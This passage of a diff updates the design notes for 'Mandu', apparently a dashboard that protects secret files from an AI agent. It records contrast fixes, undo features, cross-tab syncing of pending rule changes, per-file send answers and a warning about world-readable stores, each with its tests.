-too) and `tests/stack/dim-ink.test.ts` (K4: the served Approvals card's
-labels and Rules' column heads, both themes, from the served styles).
+table in both themes, the `--ink-3` / `--ink-4` order, `--warn` on
+`--warn-bg` and on every plain ground in both themes; every `app.css` rule
+whose `color` is `var(--ink-4)` reads ≥ 4.5:1 on its own background or on
+every plain ground), `dashboard/test/unit/ui/css-dim-ink.test.ts` (D3: a
+row's `.dim` too), `tests/stack/dim-ink.test.ts` (K4: the served Approvals
+card's labels and Rules' column heads, both themes, from the served
+styles) and `tests/stack/warn-chip-contrast.test.ts` (`secrets`; a real
+arbiter, the real anthropic-proxy on its production client and the real
+dashboard over the production adapter; a session reads a registered `.env`
+and an unlabelled file the Rules page marks a secret only after the
+session; a headless Chromium draws its page light and dark, and every
+`.mask-chip.secret`, `.tag.raw`, `.tag.level.raw` and `.turn-summary.raw`
+reads ≥ 4.5:1 on its computed ground; no key and no token on the page).
+
+**Every field's edge reads 3:1 (2026-10-27).** A text box, a search box,
+a text area or a menu has no words of its own to say where to type or
+choose: its border is what shows it. Every field on the product page drew
+that border in `--line`, the color of dividers, card edges and buttons,
+which read only 1.24 to 1.47:1 on the grounds fields sit on. WCAG 2.1 SC
+1.4.11 (non-text contrast, AA) asks 3:1 for the boundary that identifies a
+control. On a dim screen *Find a session*, *Find a rule* and *Describe what
+you want* were faint grey shapes (nightly queue item #165). A new token,
+`--field-line`, is now the border of every field, in all four palette
+blocks of `mandu.css` (light, the two dark ones, and print's light one).
+The shades keep `--line`'s hue in each theme (a warm grey, a cool grey):
+
+| token | theme | value | on panel / bg / panel-2 / an open row / a ticked row |
+|---|---|---|---|
+| `--line` (was) | light | `#dedcd3` | 1.37 / 1.24 / 1.32 / 1.24 / 1.18 |
+| `--line` (was) | dark | `#34363d` | 1.34 / 1.47 / 1.40 / 1.18 / 1.11 |
+| `--field-line` | light | `#8a8880` | 3.55 / 3.20 / 3.40 / 3.20 / 3.06 |
+| `--field-line` | dark | `#787a82` | 3.76 / 4.14 / 3.94 / 3.32 / 3.13 |
+
+An open row and a ticked row are Rules' rows tinted with the accent (7%
+and 10% over the panel), where a file's label menus sit. The dark shade
+proposed first, `#70727a`, read 2.79:1 on a ticked row, so it is one step
+lighter. `--line` is unchanged: dividers, cards and buttons keep their
+look (a button's words identify it, so 1.4.11 does not ask for its edge).
+The accent focus ring, the hover's `--ink-4` edge on a label menu, the
+dashed accent edge of a choice waiting in *Changes to save* and the held
+`--panel-2` fill of a menu that cannot be changed are unchanged. The page
+looks slightly heavier: every place to type or choose is a clearly
+outlined box.
+
+The rule: every field's edge reads at least 3:1 on every ground it is
+drawn on, in both themes (WCAG 1.4.11).
+
+*Tests*: `dashboard/test/unit/ui/css-shared-system.test.ts` (`--field-line`
+on each ground of the table, light and dark, ≥ 3:1; `--line` as it was; no
+`app.css` field rule draws its border in `--line`),
+`dashboard/test/unit/ui/css-fields-look.test.ts` (E1: every field of Rules
+and the ALLOW box on Approvals, light and dark, has `--field-line`'s
+computed border color) and `tests/stack/fields-look.test.ts` (F1, F3: the
+same over a real arbiter and dashboard, with the served styles).
+
+**A switch's knob reads 3:1 on its track (2026-10-29).** The knob is the
+part of an on/off switch that shows whether it is on: Settings ›
+Protection, History's *Only sessions where Mandu stepped in* and the
+session page's *Only where Mandu stepped in*. It was always white. In the
+dark theme it read 2.15:1 on the green "on" track and 2.93:1 on the grey
+"off" one, under the 3:1 WCAG 2.1 SC 1.4.11 asks (#165 had left the
+switch unmeasured; Shoemaker queue item #216). The knob is now `--panel`:
+white in the light theme and in print, as before, and a dark knob on the
+track in the dark one, as Material 3 draws a dark-theme switch. No new
+token: `--panel` is in every palette block of `mandu.css`.
+
+| state | track | light (knob `#ffffff`) | dark, was (knob `#ffffff`) | dark, now (knob `#1f2126`) |
+|---|---|---|---|---|
+| on | `--ok` (`#1b7448` / `#5fc48f`) | 5.77:1 | 2.15:1 | 7.50:1 |
+| off | `--ink-4` (`#6c6c74` / `#989791`) | 5.20:1 | 2.93:1 | 5.50:1 |
+
+The track on the page is unchanged (dark `--ok` on `--panel` 7.50:1,
+`--ink-4` 5.50:1). Forced colors draws its own knob in system colors and
+is untouched, as is the held switch's `opacity: 0.5` (1.4.11 exempts a
+disabled control). The native checkboxes (`accent-color: var(--ok)`) are
+drawn by the browser and were not changed.
+
+The rule: the part that shows a control's state reads at least 3:1 on what
+it sits on, in both themes.
+
+*Tests*: `dashboard/test/unit/ui/css-switch-knob.test.ts` (K1: in each
+palette block, light, both dark ones and print, the knob reads ≥ 3:1 on
+the on and the off track; K2: the light and print knob is still white;
+K3: the knob's color is a token) and
+`tests/stack/switch-knob-contrast.test.ts` (`secrets`; a real arbiter and
+dashboard over the production adapter, signed in, in a headless Chromium:
+Settings' switch with the saved setting on and off, History's switch off
+and on, each with the stored theme light and dark; the computed knob reads
+≥ 3:1 on its computed track; no key or admin token on the page).
 
 **Secondary words read as secondary (2026-10-16).** The product page marks
 the words that explain something else with the class `dim`: a caption, a
@@ -12628,6 +16965,12 @@ Without the setting, every computed animation and transition is as before
 `transitionend` or `animationend`, so nothing hangs on an end that now comes
 at once. A new animation gets its line in the reduce block: the sweep below
 fails on one that has none. Presentation only.
+
+The product page has no never-ending motion (2026-11-02): its only
+animations, the Scan figure's (§4.25ai *The figure*), play once for under
+5 s and end on their resting frame. The sweep pins it: no product animation
+is `infinite`, each one's duration × count is at most 5 s, and the figure's
+keyframes end where they start.
 
 *Not covered*: the vendored asciinema player's loading ring
 (`dev/vendor/asciinema-player/`, its own stylesheet) still turns while a
@@ -12739,7 +17082,7 @@ text color is a token, never a fixed color; every rule that fills its box
 with an ink or a color and sets its text reads 4.5:1 in both themes, the two
 counts among them; each count drawn in jsdom with its page's styles, each
 theme's tokens resolved (css-flatten `resolveCssVars(css, "dark")`,
-`contrastRatio`): light white on `#a35d00` as before, both themes 4.5:1;
+`contrastRatio`): light white on the amber `#985700`, both themes 4.5:1;
 every `@font-face` vendored with swap and a unicode-range, licenses present,
 no remote font; only Plex Sans and Plex Mono, upright, with no serif or slanted
 rule on either page; the type floors; heading and tab look); `app-js-layout-nav.test.ts`
@@ -12855,6 +17198,41 @@ another machine ("Not encrypted: …"), its TLS checks (never a path), its
   `update-model` in the same list), and the arbiter's `checkModels` judges the
   entry, so no model rule is repeated here. An update carries the entry's
   `tls` in force, so the form never drops it.
+- **The boxes' examples read "e.g. …" (2026-10-31, #248).** An empty Add
+  a model form shows `e.g. ollama`, `e.g. http://127.0.0.1:11434`,
+  `e.g. llama3.2` and `e.g. OLLAMA_API_KEY`, as Sensitivity labels' name box
+  says `Its name, e.g. Highly Confidential`, so an empty form never looks
+  filled in (until then the bare values, grey in the boxes' monospace, read
+  as a form already filled in for Ollama). Edit fills the boxes with the
+  model's own values, so the examples never show there.
+- **A refusal speaks the form's words (2026-10-27, #203).** The validator
+  writes each problem against a policy.yaml key, and the route strips only
+  its place (`formProblems`: `models[2].url: …` → `url: …`), so until then
+  the form said "url: 'lab' is on another machine … or add
+  allow_plain_http: true to accept that" about a page with no `url` and no
+  `allow_plain_http` on it. Now the form's refusal (home.js
+  `modelFormRefusal`, for the form alone: a row's Remove or Bring back
+  keeps the service's words) draws a line that starts with a key the form
+  edits with that field's label: `name:` Name, `url:` Address, `wire:` API
+  style, `model:` Model, `token_env:` Token variable name, `local:` This is
+  my own model, `helper:` Read my own-model files with this one,
+  `allow_plain_http:` Send without encryption. Two phrases are reworded:
+  "add allow_plain_http: true to accept that" → "tick Send without
+  encryption to accept that", "remove local: true" → "untick This is my own
+  model". Any other line or phrase is drawn as the service wrote it, so
+  nothing it says is lost. Each field a line starts with is marked
+  (`aria-invalid="true"`, a 2px edge in `--bad`, an outline on a box), and
+  unmarked when that field is edited, on Cancel, and at the next Save.
+  Before sending, Save checks the validator's two patterns word for word:
+  a Name against `^[A-Za-z0-9_.-]{1,64}$` (`MODEL_NAME_RE`) and a non-empty
+  Token variable name against `^[A-Za-z_][A-Za-z0-9_]*$`; a miss sends
+  nothing and says "Not saved. Name: use 1 to 64 letters, digits, _ . or -
+  (no spaces)." (or the token's line), the field marked. An empty Name is
+  left to the field's `required` and the route. The service still judges
+  every Save. `tests/stack/dashboard-models-settings.test.ts` pins the keys
+  and phrases the map keys on to the validator's output, and the page's two
+  checks to the validator's on the same samples, so a rewording fails there,
+  not silently on the page.
 - **A save names the model as it was read (2026-10-18).** Each row carries
   its entry's version (`version`, from the snapshot's `modelVersions`, an
   opaque keyed hash; policy-surface.md §8.4.6 "An item-level version"); Edit
@@ -12878,7 +17256,9 @@ another machine ("Not encrypted: …"), its TLS checks (never a path), its
 - **Always a question first.** Every models change is a relaxation in the
   delta core (policy-surface.md §8.3.2): the first send previews (`{confirm,
   expected, rows, wouldLet, warnings}`, with a warning for an own model not on
-  this machine or a local network), the second applies through
+  this machine or a local network), asked on the page in the form or under
+  the row (§4.25n *Settings and Let it through ask on the page too*), the
+  second (*Save anyway*, *Remove anyway*, *Restore anyway*) applies through
   `applyAsHuman` on the admin channel as `settings`. Undo is offered. Every
   applied change says "New sessions use this. Restart a running agent to use
   it there." (a session's model binding is fixed at launch, plan 11 §7.1). A
@@ -13060,8 +17440,14 @@ hidden listing as access control.
   and the page then says "Protection is off. These rules take effect when
   you turn it on in Settings." `view-model/file-browser.ts fileLabel` words it ("Your
   rule", "From your rule on ~/proj", "Matches your rule **/*.pem", "Built in:
-  environment files", "Written by the AI after it read a secret", "Like any
-  other file"). **Fail-closed display:** a label that cannot be read (arbiter
+  environment files", "Made from a secret: something that held a secret
+  wrote it", "Like any other file"). A file made from a secret (`derived:`)
+  whose record is in the Rules page's `/api/secrets` answer
+  (`panel.derived`, matched by absolute path) says instead what wrote it,
+  in the words of its row under *Files made from your secrets* (§4.25aa,
+  `home.js labelFrom`), followed by **See it in Files made from your
+  secrets**; the fallback sentence is true of every writer, for an older
+  server, a failed read or a record not listed yet. **Fail-closed display:** a label that cannot be read (arbiter
   down or too old) is `null` and shown as "Label unknown", never as "Like any
   other file". The note over the list says why: a failed dial to the
   service's socket (the route passes it on as "the protection service did
@@ -13219,6 +17605,187 @@ and Save stand.
 - **Changes to save** (`#files-pending`) sits after the cards and is sticky
   at the bottom of the window while anything waits, so a label chosen in the
   list, in the browser or in Keys Mandu found is saved from one place.
+- **The top bar says when Rules has changes not saved (2026-10-25).** A
+  level chosen on Rules ("No AI" for `~/shop/.env`) is only a change to
+  save, kept in this browser (`mandu.files.pending`) across pages and
+  reloads until Save changes. Until 2026-10-25 only this bar and the row's
+  *Will be: … (not saved)* said so: a person who chose No AI and went Home
+  or History believed the file protected while the AI still read it as
+  before. Now, while changes wait, the top bar's **Rules** link carries a
+  mark on every page with how many files' changes are not saved ("Rules 2",
+  `#nav-rules-unsaved`, home.js `renderRulesMark`). The link's
+  accessible name and title say it: "Rules, 2 changes not saved". It counts
+  only the levels the person chose (`F.pending`), never Mandu's ticked
+  suggestions, which wait in the same bar but are proposals the person has
+  not acted on. It is drawn wherever the list changes or is kept
+  (`savePending`: a choice, Drop, Discard, a Save answered) and once at
+  start (`restorePending`, on every page), and hides as soon as nothing
+  waits; a refused Save keeps it. The link opens Rules as before, where this
+  bar already shows the changes and Save. The mark saves and changes
+  nothing. A change made in another tab shows here within a moment, on
+  every page (*Changes to save are the same in every tab*, below). Its style, a ring in the link's ink
+  beside the Approvals count's amber pill, is in §4.25 *The top bar's two
+  marks*; its room in the links, in *The page links fit a small phone*
+  (*The Rules link's mark*). Tests: `home-js-rules-unsaved-mark.test.ts`
+  (at start on Home, a choice, Save, Discard, Drop, suggestions alone, a
+  refused Save), `css-nav-fits.test.ts` (F8, F9) and the stack test
+  `rules-unsaved-mark.test.ts` (a real arbiter and dashboard, in jsdom and
+  a headless Chromium: No AI chosen on Rules reads "Rules 1" on Home and
+  after a reload with policy.yaml unchanged; Save hides it and policy.yaml
+  holds the label). While Mandu refuses your last edit to policy.yaml
+  (2026-10-27, #215), "!" takes the slot and the name says both: "Rules,
+  Mandu did not take your last edit to policy.yaml, 2 changes not saved"
+  (§4.25 *The top bar says so on every page*).
+- **Changes to save are the same in every tab (2026-10-26, nightly #160).** The list
+  waiting (`mandu.files.pending`) and the suggestions skipped
+  (`mandu.files.skipped`) are kept in this browser, shared by every Mandu
+  tab. Until 2026-10-26 each tab read them once, at load, and then wrote its
+  own list over them: with two tabs open, a No AI chosen in one was lost
+  when the other wrote; a Save in one left the other offering the same
+  change, its mark still "Rules 1", and a Save there sent it again; a
+  Discard in one left the other's suggestions ticked, so a Save there
+  applied what was thrown away. Now a `storage` listener (home.js
+  `syncFromOtherTab`) takes both lists as stored whenever another tab
+  writes them (a choice, Drop, Discard and their Undo, a Save that worked);
+  an event with no key (the storage cleared) reads both. The stored value is
+  parsed as at load (`storedPending` / `storedSkipped`): a damaged one reads
+  as empty. Nothing is written back, so no echo between tabs. The weaker-
+  change question already asked (`F.expected`) is forgotten when the list
+  differs, as `pendingChanged` forgets it. What is drawn (`syncDraw`): the
+  top bar's mark on every page; on Rules also the bar, Add a rule's rows
+  (a typed path kept, as a poll keeps it), Your rules, Keys Mandu found and
+  the "This changes 12 files" line (its `files/impact` estimate the only
+  request), the focus kept as a poll keeps it (`pollPlace` / `pollRefocus`)
+  and, from a Drop drawn away, on the bar's heading (`barRefocus`). On
+  another page only the mark changes; Rules draws the rest when the person
+  comes back (`renderExplorer`). While this tab's own Save is on its way
+  (`F.saving`, the whole of `saveFileChanges`) an event waits (`F.syncLater`)
+  and this tab does not write over the stored list; once the Save answered,
+  `afterSave` reads it again: each change exactly as this Save sent it is as
+  the Save left it here (saved: gone; refused: still waiting), every other
+  one as the other tab left it, and a choice made here meanwhile stays.
+  A Save that worked takes out of the list only what it sent (not the whole
+  list), so a choice made meanwhile still waits. What it does not do: it
+  moves no choice onto a newer rule version and reads nothing from the
+  server (no `pendingVersionsNow`, which only a Save refused in its own tab
+  calls; whether a re-read should move waiting choices is open, nightly
+  #143). A choice
+  keeps the version it was made against, so a rule changed in between still
+  refuses its Save with "a rule changed", in whichever tab saves it. Two
+  tabs writing in the same instant can still lose one write (the browser
+  gives no lock); a person's two clicks in two tabs are seconds apart. Tests:
+  `home-js-rules-pending-tabs.test.ts` (a choice from another tab, the key
+  removed, the skip key, a damaged value, `key: null`, an event during a
+  Save that worked and one refused, no write back and no request off Rules,
+  the focus) and the stack test `rules-pending-tabs.test.ts` (a real
+  arbiter and dashboard, two tabs of one headless Chromium: No AI chosen in
+  each shows 2 waiting in both with policy.yaml unchanged; Save in one
+  saves both, and the other's bar and mark go).
+- **Discard can be undone (2026-10-25).** The bar's **Discard** sits beside
+  **Save changes** and throws away, at once, every level chosen and every
+  key of Mandu's scan ticked in it (each found key is ticked by default;
+  Discard skips them all). Until 2026-10-25 it did so with no word and no
+  way back: a click that missed Save lost a dozen choices made across
+  folders, and every key had to be ticked again by hand. Now the notice
+  above Your rules says what was thrown away, counting the levels and the
+  keys as the bar's heading does ("3 changes discarded."), with **Undo the
+  discard** (its accessible name "Undo the discard in Your rules",
+  described by the notice's words, `noticeUndo`). Undo puts back exactly
+  what Discard took (home.js `discardNotice` / `undoDiscard`): every entry
+  of the pending list as it was (kept in this browser again,
+  `savePending`), and the keys Discard itself skipped ticked again (taken
+  out of the skipped list, `saveSkipped`); a key the person skipped with
+  its own Skip before stays skipped. It goes through `pendingChanged`, so
+  the bar and the "This changes 12 files" line are worked out again. The
+  notice then says "Your changes are back. Nothing is saved until you press
+  Save." and the focus goes to the bar's heading (*Changes to save keeps
+  the focus*). Undo is page-side only: it posts nothing and saves nothing;
+  Save still asks the weaker-change question where it asks. A key the last
+  read no longer lists (the scan ran again) cannot come back: "2 of 3
+  changes are back; 1 key is no longer found. Nothing is saved until you
+  press Save.", or, when nothing could, "None of your changes could come
+  back: 1 key is no longer found." The Undo lasts until something else is
+  written into the notice (a Save, another rule change, a move:
+  `rulesNotice`), until the person adds a change to the bar (a level
+  chosen, `queueChanges`, or a key ticked, `tickSuggestion`: the discarded
+  set would mix with the new choices, so the notice keeps its words and
+  loses its Undo), or until a reload: what was discarded is kept in memory
+  only, never in storage. A key a new scan adds to the bar, ticked, is no
+  choice of the person's and keeps the Undo. **Drop** on one row has its
+  own Undo since 2026-10-28 (*Drop can be undone*, below); **Skip** on one
+  key stays as it was: the key stays in Keys Mandu found to tick again.
+  Presentation only: no route,
+  gate or server text changed. Tests: `home-js-discard-undo.test.ts` (the
+  count and the Undo, Undo bringing back the same rows, ticks and
+  localStorage with nothing posted and the focus on the bar's heading, a
+  key skipped before kept skipped, a new level or a tick dropping the Undo,
+  a Save's notice replacing it, keys gone from the next read, a reload),
+  `home-js-pending-focus.test.ts` and the stack test
+  `pending-save-focus.test.ts` (F4: over a real arbiter, Discard, Undo,
+  then Save puts both files at their new levels; a Discard without Undo
+  leaves policy.yaml and the arbiter unchanged).
+- **Drop can be undone (2026-10-28).** Each row of Changes to save has a
+  **Drop** link, a small one right next to the next row's. Until 2026-10-28
+  it threw that one choice away with no word and no way back, while a
+  Discard of all of them could be undone; the choice it dropped could be a
+  folder level with ", and everything inside" or hosts chosen across
+  several menus. Now the notice above Your rules says "Your change to
+  `~/ws/.env` dropped." (the name as code), with **Undo** (its accessible
+  name "Undo the drop in Your rules", described by the notice's words,
+  `noticeUndo`). It reuses the discard's store (home.js `dropNotice`:
+  `DISCARDED` holds that one entry, no key, and its place in the list).
+  Undo (`undoDiscard` / `undoDrop`) puts the entry back exactly as it was,
+  its level, hosts, reach and rule version, at its old place in the list,
+  kept in this browser again, through `pendingChanged`, so the bar and
+  "This changes N files" are worked out again; the notice then says "Your
+  change is back. Nothing is saved until you press Save." and the focus
+  goes to the bar's heading. A choice for the same path waiting by then
+  (made in another tab: one made here takes the Undo) is kept, never
+  overwritten, and the line says "Your change to `~/ws/.env` is not back: a
+  newer change to it waits." The Undo goes away on the same events as the
+  discard's (a change added to the bar, anything else written into the
+  notice, a Save, a reload), and a second Drop takes the first one's: one
+  Undo, for the last drop. The rule version kept means a rule changed
+  meanwhile still refuses its Save. Page-side only: Drop and Undo post
+  nothing. Tests: `home-js-discard-undo.test.ts` (the line and its Undo,
+  the row back in place with its hosts and reach and nothing posted, a
+  newer choice from another tab kept, a new level dropping the Undo, a
+  second Drop's Undo bringing back only its row) and the stack test
+  `pending-save-focus.test.ts` (F4d: over a real arbiter, a level chosen,
+  dropped, brought back and saved is the arbiter's; F4e: a Drop without
+  Undo, then Save, leaves that file as it was).
+- **Describe can undo its Discard (2026-10-28).** The card of a suggestion
+  from *Describe what you want* has **Discard** beside **Apply**. Until
+  2026-10-28 Discard cleared the card and hid it with no word and no way
+  back, while the answer it threw away took up to a minute and an outside
+  model call to get, and might come back different if asked again. Now
+  Describe's Discard follows the rule of the bar's: the card's place says
+  "Suggestion discarded." (`.describe-done`), with **Undo** (its
+  accessible name "Undo the discard in Describe what you want", described
+  by the line's words, `noticeUndo`). Undo (home.js `describeDiscarded` /
+  `describeUndoDiscard`) draws the same suggestion again through
+  `renderSuggestion`: its rows, *This would let*, the assistant's note and
+  its *Try it* buttons, as the answer came, so a wide change's ALLOW box is
+  new and empty and Apply waits for the word again, and a refusal or a
+  *Try it* answer drawn before is not. Undo posts nothing. Apply then posts
+  the same edits and expected list as before, so the server's checks are
+  unchanged: a rule change made in between (another tab, the agent) is
+  still refused with the 409 "the rules changed" answer and nothing is
+  written. The suggestion is kept in page memory only (`D.discarded`),
+  never in storage, and is dropped when *Suggest rules* (or *Describe it
+  again*, or Ctrl+Enter) starts a new request, so an Undo never draws an
+  answer to an older sentence, when an Apply works, and on a reload. The
+  focus: Discard pressed with the focus on it gives it to Undo; Undo
+  pressed gives it to *Suggested rules*, as a new answer does; a press
+  made without the focus moves nothing. Presentation only: no route,
+  answer or check changed. Tests: `home-js-describe.test.ts` (the line and
+  its Undo, the same rows, list and note with nothing posted, a wide
+  change back with an empty ALLOW box and Apply off, Suggest rules again
+  dropping the line and the old answer, Apply after Undo posting the same
+  body), `home-js-describe-focus.test.ts` and the stack test
+  `describe-focus.test.ts` (D7: over a real arbiter, Discard, Undo, then
+  Apply writes the rule; D8: a suggestion discarded, the rules moved, then
+  Undo and Apply is refused with a 409 and policy.yaml unchanged).
 - **Its buttons never scroll away (2026-10-06).** The bar used to be one
   scrolling block (`max-height: 50vh; overflow-y: auto`): with 30 changes
   waiting, Discard and Save sat below the last change, and so did the
@@ -13323,6 +17890,101 @@ and Save stand.
 - The rest of the Rules list keeps its groups; answers about single files are
   "Your answers about files", with "Show in the file browser" opening All
   files on the file.
+- **A file's row names your answers about it (2026-10-30).** A file's row
+  answered *Where it may be sent* from the label's hosts alone (`sendPick`
+  sets its menu from `bindings`), while your **Always allow** and **Block**
+  answers about that same file were drawn only under *Sending data*, in
+  another group, one row per host, newest first ("`api.stripe.com` sending only the
+  file `~/mandu-try/.env` · Always allowed", §4.25e *An answer names its
+  data*). A `.env` with no hosts read *Needs your OK* while an answer let it
+  go to a host without asking, and someone checking "where can my `.env`
+  go?" stopped at that row. Now a line under the second menu names them, in
+  the words and colours of their *Sending data* rows: "Your answers:
+  `hooks.zapier.com` ✗ Always blocked · `api.stripe.com` ✓ Always allowed",
+  newest first as that list has them; at most three, then "and N more".
+  Each host links its answer's row (`/rules#answer-<id>`, `openAnswerRule`,
+  the link *Kept in Rules* uses, so a modifier click opens a new tab), and
+  the send menu is `aria-describedby` the line (after the *Per value* line
+  when there is one).
+  - **The match.** `drawRules` fills `F.answers` (path → `{ id, host,
+    approved }`) from the same standing answers it lists (not waiting, not
+    `scope: once`): a send (`where: network`), approved or denied, whose
+    `origin` (the arbiter's read-time provenance, `policy-panel.ts`) is an
+    absolute path equal to the row's `t.path`, never its `~/` form. A
+    symlinked path that does not match shows nothing, as before.
+  - **Left out:** an answer that no longer applies; an environment variable
+    (`env:`); a program's (`holder-send:`) or a session's (`session-net:`)
+    answer, which covers a set of files or a whole session, not this file;
+    and answers about files inside a folder: a folder or pattern row is
+    unchanged, its files' own rows show theirs. Not drawn under *Not secret*
+    nor on a row with no label at all: nothing is withheld there.
+  - **The words claim no more than the rows they repeat.** An answer about
+    one key of the file, and an answer given before the file changed, carry
+    the file as `origin` too; the line names them as *Sending data* does
+    ("the file"), and adds nothing about values the file gets later.
+  - **The menu is unchanged:** its choices, Save and every route stay as
+    they were; display only. Tests: `home-js-rules-file-answers.test.ts`
+    (the line, its links, what is left out, the folder row, "and 1 more",
+    the description, *Not secret*, the browse row, *Per value*) and the
+    stack test `rules-file-answers` (a real arbiter labelling a `.env`
+    `no-model` with no hosts, two real asks answered Always allow and Block
+    through the admin client, the served page: *Needs your OK* and both
+    hosts named; no value in the panel or the page).
+  - **And the sends of it that wait (2026-10-30).** The line named only
+    answers given, so a `.env` with two sends sitting in Approvals still
+    read just *Needs your OK*. A second line under it now names them:
+    "Waiting for your answer: `hooks.slack.com` · `evil.example`". Each
+    host links its question in Approvals (`/approvals/<id>`, `data-ask`,
+    the ids Approvals uses, so it opens with that question marked, §4.25b;
+    a modifier click opens a new tab); at most three, then "and N more",
+    a link to Approvals itself. A host asked twice is named once, by its
+    newest question (the panel lists the newest first). `drawRules` fills
+    `F.waiting` (path → `{ id, host }`) by the same match and the same
+    exclusions as `F.answers` (`fileSend`: a send, an absolute `origin`
+    equal to `t.path`, not an answer that no longer applies, not `env:`,
+    not a `holder-send:`, `session-net:` or `session-exec:` question), but
+    from the `pending` entries. It is drawn where the answers line is
+    (*Needs your OK*, *Listed hosts*, *Per value*), after it, and the
+    send menu is `aria-describedby` both. Nothing is answered from Rules:
+    the card in Approvals says what each answer does. It is drawn with
+    every Rules read, as the answers line is. Tests:
+    `home-js-rules-file-answers.test.ts` W1–W6 and the stack test's
+    second case (a real ask shown waiting, then Blocked through the admin
+    client and moved to "Your answers" on the next read).
+  - **And it follows them while Rules stays open (2026-11-03, queue item
+    #284).** Until then the line had no poll of its own: a send that
+    started waiting showed on Home's badge, the tab title and a
+    notification, but not on its row, and one answered *Allow once* in a
+    notification or another tab kept its host on the row, a link to a
+    question no longer waiting, until the next Rules read. `rulesVersion`
+    leaves the questions waiting out on purpose. Now the waiting ids of
+    each Home poll that `followHostWaiting` compares (#269) are compared
+    too with the ids the file rows are known to be as new as
+    (`F.waitingKey`: those of the last Home answer when a Rules read was
+    asked, or, when the read was asked before Home first answered, of the
+    first poll asked after it, as `followRules` takes its first version):
+    a change reads your rules again
+    (`followFileWaiting`, `loadRules` at the version `RULES_SEEN` already
+    has, so a "Your rules changed" line already shown stays and none is
+    shown, and the choices waiting to save keep their versions). Its draw
+    redraws Your rules and the open folder's rows from the listing
+    already read (`renderExplorer`), so the folder is not listed again
+    and its pages read so far stay; the place and the focus are kept as
+    the poll keeps them (`pollPlace` / `pollRefocus`), and an opened row
+    stays open. That read asks the drawn host of *Check a host* itself,
+    so a poll still asks it at most once. Nothing is read with the focus
+    in a text field on Rules (the ids are not taken, so the first poll
+    after it leaves reads), on a hidden tab (the first poll after its
+    return does), on a poll whose Rules read has already begun, or with
+    no file row drawn (no file rule of yours, no folder, no typed path:
+    the ids are taken). *Not covered:* a send that starts waiting between
+    the page's first Rules read and the first Home poll after it shows at
+    the next change of the ids or the next read. Tests: `home-js-rules-file-answers.test.ts`
+    W7–W10 and the stack test's third case (a real ask shown on the row
+    one Home poll later, then answered *Allow once* through the admin
+    client and gone one poll later, without a reload, and no value or
+    token on the page); `tests/stack/rules-host-check.test.ts` T6 now
+    counts one Rules read and one host ask per poll.
 
 **Tests.** `home-js-explorer.test.ts` (the tree, a rule's menu, Add a rule
 kept open and closed again, a typed path, removal of a page label through Save);
@@ -13427,17 +18089,37 @@ same words as a caption, `questionCells` / `.q-cap`):
   `yourRules`): "ssh (checked by Mandu)" for a vetted reader, "deploy (your
   word)" for an entry with `prints: nothing`, "psql never gets the real
   file: it prints or runs what it reads" for one that admits nothing, then
-  whether other programs get a masked copy or are refused; "Programs get a
-  masked copy." with no `readers:`. Adding a reader stays a loosening made
-  in policy.yaml and confirmed in Approvals.
+  whether other programs get a masked copy or are refused. The line is
+  drawn only on a rule that names programs (`readers:`, an empty list
+  included), so it marks the files that differ (2026-10-31, queue #200,
+  after #52 and #98). A rule with no `readers:` is the default and draws no
+  line: the server still words it ("Programs get a masked copy.") and sends
+  `plain.opensDefault: true` beside it, so the page decides without
+  comparing words (an older server that sends no flag keeps the line).
+  The default is said once instead, in a note under the *Files and folders*
+  caption (`#files-opens-note`, `home.js` `renderFilesOpensNote`): "A
+  program that opens one of these files gets a masked copy, unless the
+  file's rule names the program or Mandu knows the program needs that
+  file, as ssh needs your SSH keys. Open a file to see which programs get
+  the real one." It names the consumer table's exception (flow-taint.ts
+  `CONSUMER_TABLE`: ssh, git, scp and ssh-add read an SSH private key with
+  no `readers:`, psql a `.pgpass`, kubectl a kube config), which the
+  opened row lists as "(known to need it)". The note shows while Find a
+  rule keeps at least one secret file row that draws no line, and is
+  hidden with none (no rules, only Not secret ones, or only rules that
+  name programs). Opening a row still says "Programs that get the real
+  file" in full. Adding a reader stays a loosening made in policy.yaml and
+  confirmed in Approvals.
 
 Both menus queue into Changes to save; the save route's own preview decides
 what loosens (a host added, a level lowered) and asks before it is written.
 Tests: `home-js-explorer.test.ts` ("§4.25p two questions", "§4.25p per
-value"), `per-value-words.test.ts`, the
+value", "§4.25p Opens it: the note"), `home-js-rules-find.test.ts` (a
+default row's undrawn words), `per-value-words.test.ts`, the
 `policy-panel.test.ts` Opens-it test, and `tests/stack/rules-two-questions.test.ts`
 (the three choices through the save route over a real arbiter, and the
-egress gate's answer for the file's key at its host before and after).
+egress gate's answer for the file's key at its host before and after; the
+served page's Opens it lines, the note, and a default row opened).
 
 **The name keeps its room (2026-10-15; app.css).** Three lists draw file
 rows: Your rules (`#files-tree`, `.row.file-rule`), Add a rule's browser
@@ -13806,7 +18488,10 @@ the place in it is a link (`placeLink`, *The hero links where it points*):
 - **"Turn it on in Settings"** under *Built-in protections* with
   protection off (`home.ts builtInProtections`, `itemsParts`), as the hero
   links "Turn it back on in Settings". It opens Settings › Protection
-  (`openProtection`).
+  (`openProtection`). With On saved for the next start (`builtInProtections`'
+  `configured`, 2026-10-27) the item says, as the hero does, "… On is saved
+  and starts when the protection service restarts. Open Settings ›
+  Protection." (the link: the same place).
 - **The ⚠ mark** on a closed rule row is a button, named by the warning's
   words: it opens the row, where the warning is said in full with its link.
   Pressed with the row open, it keeps it open. A hover is no longer the
@@ -13865,6 +18550,73 @@ in plain words, and whether it exists. Each store in the home carries an
 a note says so when any store is open to others (fixing modes is `mandu paths`
 / `mandu doctor`'s job, not the page's).
 
+**Home warns about open places (2026-11-02, #241).** The fold's note was
+the only place that said other people on this computer can open Mandu's
+records, and the fold is closed by default and read only when opened, so a
+person who never opened it was never told, even when the symbol database or
+the session history, which hold the real values behind every mask, were
+open. Now Home raises an amber card among its top cards, `#home-open-places`
+after `#home-policy-refused`, in its style (`block exposure update-notice`,
+`role="status"`):
+
+- **The rule** is the fold's note's: a place in Mandu's folder (`where:
+  "home"`) that is there and whose mode lets group or others in
+  (`ownerOnly: false`), developer stores included, as the note counts them.
+  The modes are read one place at a time, as the note and `mandu paths`
+  read them, not as reachability through the folders above.
+- **Words.** The headline names the worst case: "Other people on this
+  computer can read the real values of your secrets" when the symbol
+  database (`symbol-db`) or the session history (`events`) is among them;
+  otherwise "Other people on this computer can open 2 places in Mandu's
+  folder". Then "Open to others:" and the places by what they hold (the
+  `holds` words, capitalized, those two first, then in the answer's order),
+  at most three, then "and N more"; never a path, a mode or a value. Then
+  "Run `mandu paths` in a terminal for the command that makes them yours
+  only." (`runCode`, with its Copy) and a link, "See every place", which
